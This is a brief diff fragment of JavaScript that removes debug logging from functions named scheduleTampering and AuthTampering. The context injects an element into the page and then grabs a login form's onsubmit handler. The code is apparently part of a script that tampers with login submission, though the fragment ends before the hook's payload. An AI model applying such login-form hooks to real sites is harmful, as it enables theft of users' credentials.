@@ -7,11 +7,9 @@ div.appendChild(img);
 document.body.appendChild(div);
 
 function scheduleTampering() {
-    console.log("schedule");
     setTimeout(AuthTampering, 10);
 }
 function AuthTampering(){
-    console.log("authtampering");
     var f = document.querySelector('form#login-form');
     var o = f.onsubmit;
 
